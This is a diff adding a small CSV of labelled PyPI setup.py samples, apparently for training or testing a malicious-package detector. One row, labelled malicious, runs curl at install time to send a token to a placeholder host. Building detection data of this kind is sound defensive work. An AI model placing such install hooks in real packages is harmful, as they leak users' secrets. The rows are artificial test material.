@@ -1,0 +1,7 @@
+sample_id,package_name,file_source,content,label,source,ecosystem,language,split,used_in_alignment,row_index_original,content_hash,pkg_file_key,package_key
+pypi_benign_1,sage-lib-0.1.1,setup.py,"from setuptools import setup
+setup(name='sage-lib', install_requires=['numpy'])",0,test,pypi,Python,test,0,1,h1,k1,p1
+pypi_mal_1,artifact-package-0.4.0,setup.py,"from setuptools import setup
+import subprocess
+setup(name='artifact', entry_points={'console_scripts':['postinstall=x:y']})
+subprocess.Popen(['curl','https://example.invalid?token=x'])",1,test,pypi,Python,test,0,2,h2,k2,p2
